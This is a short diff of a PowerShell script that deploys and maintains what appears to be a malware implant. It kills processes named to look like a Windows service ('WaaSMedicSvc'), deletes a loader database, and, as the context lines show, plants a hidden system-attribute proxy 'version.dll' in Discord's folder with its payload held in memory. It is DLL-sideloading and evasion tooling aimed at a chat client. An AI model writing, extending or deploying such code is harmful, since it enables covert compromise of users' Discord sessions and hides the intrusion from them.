@@ -29,10 +29,18 @@ function Get-PayloadRoot {
 }
 
 function Stop-PayloadProcesses {
-    $names = @("WaaSMedicSvc", "RuntimeHost")
+    $names = @("WaaSMedicSvc", "Loader", "RuntimeHost")
     foreach ($name in $names) {
         Get-Process -Name $name -ErrorAction SilentlyContinue | Stop-Process -Force -ErrorAction SilentlyContinue
     }
+
+    $payloadRoot = Get-PayloadRoot
+    $loaderDb = Join-Path $payloadRoot "WaaSMedicSvc.db"
+    if (Test-Path -LiteralPath $loaderDb) {
+        Unlock-DeployPath -Path $loaderDb
+        Remove-Item -LiteralPath $loaderDb -Force -ErrorAction SilentlyContinue
+    }
+
     Start-Sleep -Seconds 2
 }
 
@@ -169,5 +177,6 @@ Write-Host "[OK] Deploy complete (in-memory mode - version.dll only)" -Foregroun
 Write-Host "  Proxy   : $discordFolder\version.dll  [hidden+system, payload in memory]" -ForegroundColor White
 Write-Host ""
 Write-Host "Open Discord to start the session." -ForegroundColor Yellow
+
 
 
